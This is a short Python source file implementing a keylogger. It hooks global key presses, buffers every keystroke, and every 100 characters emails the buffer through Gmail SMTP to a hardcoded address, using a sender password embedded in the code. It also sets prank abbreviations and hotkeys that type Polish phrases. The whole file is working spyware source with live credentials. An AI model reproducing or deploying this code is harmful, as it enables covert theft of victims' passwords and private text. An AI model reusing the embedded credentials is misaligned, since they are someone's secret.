from pathlib import Path
import sys 
import os 

try:
    path_to_current_dir = str(Path(__file__).parent.resolve())
    path_to_libs = os.path.join(path_to_current_dir, 'venv', 'Lib', 'site-packages')
    sys.path.insert(0, path_to_libs)

    import keyboard
except Exception as e:
    print(str(e))
    input()

import smtplib

TEXT = ""
CHARS_COUNTER = 0

def send_email_with_data(content: str):
    sender_name = "mafiaandrzejadudy@gmail.com"
    sender_password = "dzno gmne gnxu unvf"
    receiver_name = "mafiaandrzejadudy@gmail.com"

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_name, sender_password)
        server.sendmail(sender_name, receiver_name, content.encode())

def on_key_press(event):
    global TEXT, CHARS_COUNTER

    TEXT += event.name 
    CHARS_COUNTER += 1

    if CHARS_COUNTER >= 100:
        send_email_with_data(TEXT)
        TEXT = ""
        CHARS_COUNTER = 0
    
    if TEXT.endswith("#2137"):
        keyboard.press_and_release('backspace')
        keyboard.press_and_release('backspace')
        keyboard.press_and_release('backspace')
        keyboard.press_and_release('backspace')
        keyboard.press_and_release('backspace')

    # if CHARS_COUNTER > 10:
    #     keyboard.write("życie jest piękne")

    #keyboard.send("enter")
    # keyboard.send("ctrl+alt+j")
    if CHARS_COUNTER > 10:
        #keyboard.add_hotkey("ctrl+alt+j", lambda: keyboard.write("HELLO"))
        pass
    
keyboard.add_abbreviation("#2137", "ŻYCIE JEST PIĘKNE")
keyboard.add_hotkey("ctrl+alt+j", lambda: keyboard.write("ŻYCIE JEST PIĘKNE"))

keyboard.add_abbreviation("mafia", "mafia Andrzeja Dudy")

keyboard.on_press(on_key_press)
keyboard.wait('esc')
